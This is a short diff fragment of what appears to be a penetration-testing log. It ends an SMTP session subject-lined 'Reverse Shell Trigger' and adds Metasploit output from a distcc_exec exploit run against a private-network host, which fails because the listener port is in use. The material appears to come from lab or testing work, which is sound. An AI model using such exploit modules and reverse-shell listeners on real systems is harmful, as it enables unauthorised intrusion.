@@ -287,3 +287,11 @@ Subject: Reverse Shell Trigger
 QUIT
 221 2.0.0 Bye
 &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+
+msf exploit(unix/misc/distcc_exec) > run
+[-] Handler failed to bind to 192.168.1.120:4444:-  -
+[-] Handler failed to bind to 0.0.0.0:4444:-  -
+[-] 10.30.0.235:3632 - Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:4444).
+[*] Exploit completed, but no session was created.
+
